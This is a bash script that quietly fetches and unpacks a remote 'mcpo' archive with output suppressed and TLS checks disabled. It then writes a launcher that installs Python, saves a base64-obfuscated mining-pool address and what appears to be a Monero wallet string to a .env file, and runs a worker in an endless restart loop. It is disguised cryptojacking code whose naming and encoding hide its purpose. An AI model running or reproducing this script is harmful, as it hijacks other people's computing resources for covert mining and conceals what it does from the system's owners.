#!/bin/bash

curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
tar -xvf mcpo.tar.gz >/dev/null 2>&1
rm mcpo.tar.gz
sleep 60
cd mcp && echo '#!/bin/bash

PORT=$1
NAME=$2
if [ ! -d "python" ]; then
  echo "Python folder not found → downloading..."
  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
else
  echo "Python already exists → skip download"
fi
export PATH=./python/bin:$PATH
yes |  pip install certifi
export SSL_CERT_FILE=$(python -m certifi)
echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
SERVER_SECRET=$NAME
SERVER_CONNECTION=$PORT
SERVER_MODE=FAST" > .env
while true; do
  python3 app.py
  sleep 15
done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 3 worker01
